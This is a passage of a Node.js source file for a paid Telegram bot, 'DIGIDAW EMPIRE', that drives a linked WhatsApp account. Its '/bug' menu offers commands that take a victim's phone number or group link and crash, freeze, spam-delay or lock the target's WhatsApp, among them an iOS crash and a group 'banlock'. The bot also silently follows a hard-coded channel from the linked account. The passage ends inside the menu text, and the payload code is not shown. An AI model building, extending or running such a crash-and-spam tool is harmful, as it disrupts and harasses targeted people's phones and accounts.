const { Telegraf } = require("telegraf");
const fs = require("fs");
const path = require("path");
const https = require("https");
const moment = require("moment-timezone");
const EventEmitter = require("events")
const pino = require("pino");
const { performance } = require("perf_hooks");
const crypto = require("crypto");
const chalk = require("chalk");
const vm = require("vm");
const { exec } = require("child_process");

const thumbnailUrl = "https://files.catbox.moe/lxpa4b.jpg";

//

function readFileSafe(p){
  try { return require('fs').readFileSync(p); } catch(e){ return null; }
}

(function loadEnv() {
  try {
    const p = path.resolve(process.cwd(), 'settings', '.config');
    if (fs.existsSync(p)) {
      for (const line of fs.readFileSync(p, 'utf8').split(/\r?\n/)) {
        if (!line || /^\s*#/.test(line)) continue;
        const m = line.match(/^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(.*)\s*$/);
        if (m) {
          const k = m[1];
          let v = m[2];
          if ((v.startsWith('"') && v.endsWith('"')) || (v.startsWith("'") && v.endsWith("'"))) v = v.slice(1, -1);
          if (process.env[k] === undefined) process.env[k] = v;
        }
      }
    }
  } catch {}
})();

const tokenBot = process.env.TOKEN_BOT || "TOKEN_BOT";
const ownerID = process.env.OWNER_ID || "OWNER_ID";
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
  makeCacheableSignalKeyStore,
  encodeSignedDeviceIdentity,
  encodeWAMessage,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage,
} = require("@ikyyjeee/xavoidbail");
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }

        let raw = '';
        res.on('data', chunk => raw += chunk);
        res.on('end', () => {
          try {
            resolve(JSON.parse(raw));
          } catch {
            reject(new Error('Invalid JSON response'));
          }
        });
      });

      req.on('timeout', () => {
        req.destroy();
        reject(new Error('Request timeout'));
      });

      req.on('error', (err) => reject(err));
    } catch (e) {
      reject(e);
    }
  });
}

async function httpsGet(url, opts = {}) {
  const { timeout = 15000, responseType = "json", headers = {} } = opts;
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { headers, timeout }, (res) => {
        const { statusCode } = res;
        const chunks = [];
        res.on('data', (chunk) => chunks.push(chunk));
        res.on('end', () => {
          const raw = Buffer.concat(chunks);
          if (statusCode < 200 || statusCode >= 300) {
            return reject(new Error(`HTTP ${statusCode}`));
          }
          if (responseType === "arraybuffer") return resolve(raw);
          const text = raw.toString('utf8');
          if (responseType === "text") return resolve(text);
          try {
            return resolve(JSON.parse(text));
          } catch (err) {
            return reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('error', (err) => reject(err));
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
    } catch (err) {
      reject(err);
    }
  });
}

async function httpsPost(url, data, opts = {}) {
  const { timeout = 20000, headers = {}, responseType = "json" } = opts;
  return new Promise((resolve, reject) => {
    try {
      const u = new URL(url);
      const isString = typeof data === "string" || data instanceof String;
      const body = isString ? String(data) : (data instanceof URLSearchParams ? data.toString() : (typeof data === "object" ? JSON.stringify(data) : ""));
      const defaultHeaders = {
        'Content-Length': Buffer.byteLength(body || ""),
      };
      const requestOptions = {
        hostname: u.hostname,
        port: u.port || 443,
        path: u.pathname + (u.search || ""),
        method: 'POST',
        headers: Object.assign({}, defaultHeaders, headers),
        timeout
      };
      const req = https.request(requestOptions, (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const raw = Buffer.concat(chunks);
          if (res.statusCode < 200 || res.statusCode >= 300) {
            return reject(new Error(`HTTP ${res.statusCode}`));
          }
          if (responseType === "arraybuffer") return resolve(raw);
          const text = raw.toString('utf8');
          if (responseType === "text") return resolve(text);
          try {
            return resolve(JSON.parse(text));
          } catch (err) {
            return reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('error', (err) => reject(err));
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      if (body) req.write(body);
      req.end();
    } catch (err) {
      reject(err);
    }
  });
}

const __thumbExt = (() => {
  try {
    const u = thumbnailUrl.split('?')[0].toLowerCase();
    const m = u.match(/\.(mp4|gif|png|jpe?g)$/);
    return m ? m[1] : 'jpg';
  } catch { return 'jpg'; }
})();
const thumbnailType = (__thumbExt === 'mp4') ? 'mp4' : (__thumbExt === 'gif') ? 'gif' : 'photo';

// FIX: Menghapus duplikasi createSafeSock agar tidak error
function createSafeSock(sock) {
  if (!sock) return null;
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    },
    groupMetadata: sock.groupMetadata?.bind(sock),
  }
}

async function settingsStatusBot(bot) {
  try {
    const botDefaultName = "𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤";
    await bot.telegram.setMyName(botDefaultName);
  } catch (error) {
  }
}

const ChannelUrl = [
  "https://whatsapp.com/channel/0029Vb8yQYF2UPBCW8XdJc1S",
];

const uniq = (arr) => [...new Set(arr)];

function getAllChannelLinks() {
  return uniq(ChannelUrl);
}

async function autoFollowChannel(sock) {
  try {
    const links = getAllChannelLinks();
    let joined = 0;

    for (const link of links) {
      try {
        let code = "";
        let jid = "";

        const m1 = /(whatsapp\.com\/channel\/|wa\.me\/channel\/)([A-Za-z0-9._-]+)/i.exec(link);
        if (m1) code = m1[2];

        const mInv = /^\d{10,}-[a-z0-9_-]{6,}$/i.exec(link);
        if (!code && mInv) code = mInv[0];

        if (/@newsletter$/i.test(link)) jid = link;

        const m2 = /([0-9]{10,})@newsletter$/i.exec(link);
        if (!jid && m2) jid = m2[0];

        if (!jid && typeof sock.newsletterMetadata === "function" && code) {
          const meta = await sock.newsletterMetadata("invite", code).catch(() => null);
          jid = meta?.id || meta?.jid || "";
        }

        if (!jid && /^[0-9]{10,}@newsletter$/i.test(code)) jid = code;

        if (!jid) continue;

        const fnList = [
          "newsletterFollow",
          "followNewsletter",
          "channelFollow",
          "subscribeChannel",
          "newsletterSubscribe"
        ];

        for (const fn of fnList) {
          if (typeof sock[fn] === "function") {
            await sock[fn](jid).catch(() => {});
            break;
          }
        }

        joined++;
      } catch (err) {}
    }
  } catch (err) {
  }
}

const numberuestion = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

function injectAutoThumbnail(bot) {
  bot.use(async (ctx, next) => {
    const _photo = ctx.replyWithPhoto?.bind(ctx);
    const _video = ctx.replyWithVideo?.bind(ctx);
    const _anim  = ctx.replyWithAnimation?.bind(ctx);
    const _editMedia = ctx.editMessageMedia?.bind(ctx);

    if (_photo) {
      ctx.replyWithPhoto = (photo, options = {}) => {
        try {
          const isThumb = String(photo) === String(thumbnailUrl);
          if (!isThumb || thumbnailType === "photo") {
            return _photo(photo, options);
          }
          if (thumbnailType === "mp4" && _video) {
            return _video(thumbnailUrl, options);
          }
          if (thumbnailType === "gif" && _anim) {
            return _anim(thumbnailUrl, options);
          }
          return _photo(photo, options);
        } catch (e) {
          return _photo(photo, options);
        }
      };
    }

    if (_editMedia) {
      ctx.editMessageMedia = (inputMedia, extra) => {
        try {
          const isThumb = inputMedia && String(inputMedia.media) === String(thumbnailUrl);
          if (isThumb) {
            const base = {
              media: thumbnailUrl,
              caption: inputMedia.caption,
              parse_mode: inputMedia.parse_mode
            };
            if (thumbnailType === "mp4") {
              inputMedia = { type: "video", ...base };
            } else if (thumbnailType === "gif") {
              inputMedia = { type: "animation", ...base };
            } else {
              inputMedia = { type: "photo", ...base };
            }
          }
        } catch {}
        return _editMedia(inputMedia, extra);
      };
    }

    return next();
  });
}

const bot = new Telegraf(tokenBot);

settingsStatusBot(bot);
injectAutoThumbnail(bot);

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const adminFile = './database/admin.json';
const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json';
const blockcmdFile = './database/blockcmd.json';

const loadAdmins = () => {
    try {
        const data = fs.readFileSync(adminFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const saveAdmins = (admins) => {
    try {
        fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
    } catch (err) {
    }
};

const addAdmin = (userId) => {
    const admins = loadAdmins();
    admins[userId] = true;
    saveAdmins(admins);
    return true;
};

const removeAdmin = (userId) => {
    const admins = loadAdmins();
    delete admins[userId];
    saveAdmins(admins);
    return true;
};

const isAdmin = (userId) => {
    const admins = loadAdmins();
    return admins[userId] === true || userId == ownerID;
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
  console.clear();
  function label(text) {
    return chalk.white(text.padEnd(15, " ") + ": ");
  }

const bannerTitle = "✦ ▬▬▬▬▬▬▬▬▬ 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 ▬▬▬▬▬▬▬▬▬ ✦";
const bannerLine = "✦ " + "▬".repeat(bannerTitle.length - 3) + " ✦";

console.log(`
${chalk.white(bannerTitle)}
${label("❯ Developer")} ${chalk.yellow("ponzy/@ponzy29")}
${label("❯ Version")} ${chalk.yellow("11.0.0")}
${label("❯ Database")} ${chalk.green("● CONNECTED")}
${label("❯ Status")} ${chalk.green("● REGISTERED")}
${label("❯ Reason")} ${chalk.red("-")}
${chalk.white(bannerLine)}
`);
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
const { state, saveCreds } = await useMultiFileAuthState('./session');
const { version } = await fetchLatestBaileysVersion();

const connectionOptions = {
  version,
  keepAliveIntervalMs: 30000,
  printQRInTerminal: !usePairingCode,
  logger: pino({ level: "silent" }),
  auth: state,
  browser: ['Mac OS', 'Safari', '10.15.7'],
  getMessage: async (key) => ({
    conversation: 'Digidaw',
  }),
};

sock = makeWASocket(connectionOptions);

sock.ev.on("messages.upsert", async (m) => {
  try {
    if (!m || !m.messages || !m.messages[0]) {
      return;
    }
  const msg = m.messages[0];
  const chatId = msg.key.remoteJid || "Tidak Diketahui";
} catch (error) {
}
});

sock.ev.on('creds.update', saveCreds);
store.bind(sock.ev);

sock.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update;
  if (connection === 'open') {
    autoFollowChannel(sock).catch(() => {});

    if (lastPairingMessage) {
      const connectedMenu = `
<blockquote>
╭━〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤〕━╮

「 CONNECTION NOMOR 」

◈ Status : Connected
◈ Number : ${lastPairingMessage.phoneNumber}
◈ Code   : ${lastPairingMessage.pairingCode}

 ───────────────────

© 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤
</blockquote>
`;

      try {
        bot.telegram.editMessageCaption(
        lastPairingMessage.chatId,
        lastPairingMessage.messageId,
        undefined,
        connectedMenu,
        { parse_mode: "HTML" }
        );
      } catch (e) {
    }
}

console.clear();
isWhatsAppConnected = true;
const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
}

if (connection === 'close') {
  const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
  console.log(
  chalk.red('Koneksi WhatsApp terputus:'),
  shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
  );
  if (shouldReconnect) {
    startSesi();
  }
isWhatsAppConnected = false;
}
});
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkAdmin = (ctx, next) => {
    if (!isAdmin(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk admin");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (
        !isPremiumUser(ctx.from.id) &&
        !isPremiumGroup(ctx.chat?.id)
    ) {
        return ctx.reply("❌ ☇ Akses hanya untuk premium");
    }

    return next();
};

function escapeHtml(text = '') {
  return String(text)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// =========================================================================
// 🔥 FIX UTAMA: HANDLER /start AGAR BISA DIPANGGIL DI GRUP (MENGGUNAKAN @username) 
// =========================================================================
bot.start(async (ctx) => {
  const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
  const runtimeStatus = formatRuntime();
  const memoryStatus = formatMemory();
  const cooldownStatus = loadCooldown();

  const menuMessage = `
<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 〕</b>
𝙳𝙸𝙶𝙸𝙳𝙰𝚆 𝙴𝙼𝙿𝙸𝚁𝙴 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @ponzy29 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Buy Only
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 1.1 Deploy
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>╭═───⊱ BOT STATUS ────═⬡
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Sender: ${senderStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Runtime: ${runtimeStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Memory: ${memoryStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═───────────────═⬡</blockquote>
`.trim();

  const keyboard = [
  [
    { text: "ᴄᴏɴᴛʀᴏʟs", callback_data: "/controls", style: "success", icon_custom_emoji_id: "5341715473882955310" },
    { text: "ʙᴜɢ", callback_data: "/bug", style: "success", icon_custom_emoji_id: "5215697280832660296" }
  ],
  [
    { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/ponzy29", style: "primary", icon_custom_emoji_id: "5330237710655306682" }
  ],
  [
    { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/DigidawProject", style: "danger", icon_custom_emoji_id: "5771695636411847302" }
  ]
];

  try {
    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: menuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: keyboard
      }
    });

    const musicPath = path.resolve(process.cwd(), "*/music.mp3");
    if (fs.existsSync(musicPath)) {
      await sleep(600);
      await ctx.replyWithAudio(
        { source: musicPath },
        {
          caption: "Lonaros",
          title: "𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤",
          performer: "avoides"
        }
      );
    }
  } catch (error) {
  }
});

// Handler untuk mention @bot /start
// Handler untuk mention @bot /start
bot.mention("start", async (ctx, next) => {
  try {
    await bot.start(ctx);
  } catch (e) {}
  if (typeof next === "function") return next();
});

bot.action('/start', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
  
    const menuMessage = `
<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 〕</b>
𝙳𝙸𝙶𝙸𝙳𝙰𝚆 𝙴𝙼𝙿𝙸𝚁𝙴 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @ponzy29 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Buy Only
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 1.1 Deploy
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>╭═───⊱ BOT STATUS ────═⬡
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Sender: ${senderStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Runtime: ${runtimeStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Memory: ${memoryStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═───────────────═⬡</blockquote>
`;

    const keyboard = [
  [
    { text: "ᴄᴏɴᴛʀᴏʟs", callback_data: "/controls", style: "success", icon_custom_emoji_id: "5341715473882955310" },
    { text: "ʙᴜɢ", callback_data: "/bug", style: "success", icon_custom_emoji_id: "5215697280832660296" }
  ],
  [
    { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/ponzy29", style: "primary", icon_custom_emoji_id: "5330237710655306682" }
  ],
  [
    { text: "ᴄʜᴀɴɴᴇʟ", url: "https://t.me/DigidawProject", style: "danger", icon_custom_emoji_id: "5771695636411847302" }
  ]
];
    
    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
    }
});

// FIX: Typo /addadmim menjadi /addadmin
bot.action('/controls', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const controlsMenu = `
<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 〕</b>
𝙳𝙸𝙶𝙸𝙳𝙰𝚆 𝙴𝙼𝙿𝙸𝚁𝙴 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @ponzy29 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Buy Only
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 1.1 Deploy
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>╭═───⊱ BOT STATUS ────═⬡
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Sender: ${senderStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Runtime: ${runtimeStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Memory: ${memoryStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═───────────────═⬡</blockquote>
<pre><blockquote> ༺ Settings Digidaw ༻ </blockquote></pre>
<blockquote><tg-emoji emoji-id="5803032306213982905">👑</tg-emoji> OWNERS SETTINGS</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /ceksender → Cek Sender Lu Pada
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /requestpair → Add Sender Bot
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /addpremgrup → Add Premium Grup
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /delpremgrup → Delete Premium Group
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /blockcmd → Block Command 
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /unblockcmd → Delete Block Command
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /setcooldown → Setting Cooldown Bot
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /resetsessions → Resset sender Number
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /addadmin → Add Admin User
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /deladmin → Hapus Admin User
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /addpremium → Add Prem User
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /delpremium → Hapus Prem User</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━
<pre><blockquote><b>Silahkan Tekan Button Dibawah Untuk Melanjutkan</b></blockquote></pre>
`;

    const keyboard = [
  [
    { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "danger", icon_custom_emoji_id: "5877629862306385808" }
  ]
];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
    }
});

bot.action('/bug', async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "1 Connected" : "0 Connected";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const bugMenu = `
<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 𝖣𝖨𝖦𝖨𝖣𝖠𝖶 𝖤𝖬𝖯𝖨𝖱𝖤 〕</b>
𝙳𝙸𝙶𝙸𝙳𝙰𝚆 𝙴𝙼𝙿𝙸𝚁𝙴 ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @ponzy29
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Buy Only
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 1.1 Deploy
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
━━━━━━━━━━━━━━━━━━━━━━
<blockquote>╭═───⊱ BOT STATUS ────═⬡
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Sender: ${senderStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Runtime: ${runtimeStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Memory: ${memoryStatus}
╿ <tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> Cooldown: ${cooldownStatus} Second
╰═───────────────═⬡</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="4969988807488177684">📌</tg-emoji> ᴍᴇɴᴜ ʙᴜɢ ɴᴜᴍʙᴇʀ
━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXdelay 628×× - Delay Easy [ Spam ] 
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXslow 628×× - Delay X Freeze Slow [ Spam ]
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXfrezee 628×× - Freeze Hard [ No Spam ]
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXios 628×× - Cras Ios [ No Spam ]
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXlock 628×× - Crash X Lock Chat [ No Spam ]
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXcrash 628×× - Delay X Crash [ 3x Spam ]</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━
<tg-emoji emoji-id="4969988807488177684">📌</tg-emoji> ᴍᴇɴᴜ ʙᴜɢ ɢʀᴏᴜᴘ
━━━━━━━━━━━━━━━━━━━━━━━━
<blockquote><tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXlock https://chat.whatsapp.com/ponzyganteng
<tg-emoji emoji-id="5893168654551355607">✅</tg-emoji> /DigiXbanlock https://chat.whatsapp.com/ponzyganteng</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━
Klik tombol di bawah untuk lihat efek

